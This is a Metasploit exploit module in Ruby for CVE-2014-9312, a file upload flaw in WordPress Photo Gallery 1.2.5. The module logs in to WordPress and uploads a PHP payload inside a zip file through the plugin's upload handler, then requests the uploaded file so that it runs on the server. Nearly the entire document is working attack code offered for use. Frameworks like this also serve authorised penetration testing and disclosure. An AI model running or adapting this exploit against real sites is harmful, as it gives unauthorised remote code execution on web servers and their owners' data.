##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'
require 'json'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Photo Gallery 1.2.5 Unrestricted File Upload',
      'Description'     => %q{Photo Gallery Plugin for WordPress contains a flaw that allows a
                              remote attacker to execute arbitrary PHP code. This flaw exists
                              because the photo-gallery\photo-gallery.php script allows access
                              to filemanager\UploadHandler.php. The post() method in UploadHandler.php
                              does not properly verify or sanitize user-uploaded files.},
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Kacper Szurek',                  # Vulnerability disclosure
          'Rob Carr <rob[at]rastating.com>' # Metasploit module
        ],
      'References'      =>
        [
          ['OSVDB', '117676'],
          ['WPVDB', '7769'],
          ['CVE', '2014-9312'],
          ['URL', 'http://security.szurek.pl/photo-gallery-125-unrestricted-file-upload.html']
        ],
      'DisclosureDate'  => 'Nov 11 2014',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['photo-gallery < 1.2.6', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with'])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('photo-gallery', '1.2.6')
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def generate_mime_message(payload, name)
    data = Rex::MIME::Message.new
    zip = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    zip.add_file("#{name}.php", payload.encoded)
    data.add_part(zip.pack, 'application/x-zip-compressed', 'binary', "form-data; name=\"files\"; filename=\"#{name}.zip\"")
    data
  end

  def exploit
    print_status("#{peer} - Authenticating using #{username}:#{password}...")
    cookie = wordpress_login(username, password)
    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?
    print_good("#{peer} - Authenticated with WordPress")

    print_status("#{peer} - Preparing payload...")
    payload_name = Rex::Text.rand_text_alpha(10)
    data = generate_mime_message(payload, payload_name)

    upload_dir = "#{Rex::Text.rand_text_alpha(5)}/"
    print_status("#{peer} - Uploading payload to #{upload_dir}...")
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => wordpress_url_admin_ajax,
      'vars_get'  => { 'action' => 'bwg_UploadHandler', 'dir' => upload_dir },
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => data.to_s,
      'cookie'    => cookie
    )

    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
    fail_with(Failure::UnexpectedReply, "Server responded with status code #{res.code}") if res.code != 200
    print_good("#{peer} - Uploaded the payload")

    print_status("#{peer} - Parsing server response...")
    begin
      json = JSON.parse(res.body)
      if json.nil? || json['files'].nil? || json['files'][0].nil? || json['files'][0]['name'].nil?
        fail_with(Failure::UnexpectedReply, 'Unable to parse the server response')
      else
        uploaded_name = json['files'][0]['name'][0..-5]
        php_file_name = "#{uploaded_name}.php"
        payload_url = normalize_uri(wordpress_url_backend, upload_dir, uploaded_name, php_file_name)
        print_good("#{peer} - Parsed response")

        register_files_for_cleanup(php_file_name)
        register_files_for_cleanup("../#{uploaded_name}.zip")
        print_status("#{peer} - Executing the payload at #{payload_url}")
        send_request_cgi(
        {
          'uri'     => payload_url,
          'method'  => 'GET'
        }, 5)
        print_good("#{peer} - Executed payload")
      end
    rescue
      fail_with(Failure::UnexpectedReply, 'Unable to parse the server response')
    end
  end
end
